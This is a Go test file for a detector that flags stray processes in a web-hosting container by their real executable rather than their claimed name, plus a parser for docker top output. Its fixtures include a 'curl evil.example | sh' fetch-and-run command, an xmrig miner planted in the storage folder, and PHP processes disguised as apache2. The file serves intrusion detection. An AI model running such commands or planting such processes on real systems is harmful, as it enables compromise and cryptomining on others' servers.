package sites

import "testing"

func TestAProcessIsJudgedByItsRealExecutableNotItsName(t *testing.T) {
	long := int64(strayAfter.Seconds()) + 1
	for _, c := range []struct {
		args, exe string
		secs      int64
		lsp, want bool
	}{
		{"apache2 -DFOREGROUND", "/usr/sbin/apache2", long * 100, false, false},
		{"php /opt/phpactor/bin/phpactor language-server", "/usr/local/bin/php", long * 10, true, false},
		{"php artisan migrate --force", "/usr/local/bin/php", 30, false, false}, // a command still inside its time
		{"php -r while(true){}", "/usr/local/bin/php", long, false, true},       // eval code that outlived its request
		{"/var/www/html/storage/xmrig --donate-level 1", "/var/www/html/storage/xmrig", long, false, true},
		{"sh -c curl evil.example | sh", "/bin/dash", long, false, true},
		// Found by the audit: a name is not an identity.
		{"apache2 -DFOREGROUND", "/usr/local/bin/php", long, false, true},                           // cli_set_process_title
		{"php storage/x.php phpactor", "/usr/local/bin/php", long, false, true},                     // no editor open
		{"/usr/sbin/apache2", "/var/www/html/storage/apache2", long, false, true},                   // a binary named apache2
		{"php /opt/phpactor/bin/phpactor language-server", "/usr/local/bin/php", long, false, true}, // editor closed
		{"php -r sleep(1e9);", "", long, false, true},                                               // gone, or unreadable
	} {
		if got := strayProcess(c.args, c.secs, c.exe, c.lsp); got != c.want {
			t.Errorf("%q (%s) after %ds, lsp=%v: stray=%v, want %v", c.args, c.exe, c.secs, c.lsp, got, c.want)
		}
	}
}

func TestDockerTopIsParsed(t *testing.T) {
	ps := parseTop("PID ELAPSED COMMAND\n422075 58290 apache2 -DFOREGROUND\n600001 900 php -r sleep(99999);\nbad line\n")
	if len(ps) != 2 || ps[1].pid != 600001 || ps[1].secs != 900 || ps[1].args != "php -r sleep(99999);" {
		t.Fatalf("parsed: %+v", ps)
	}
}
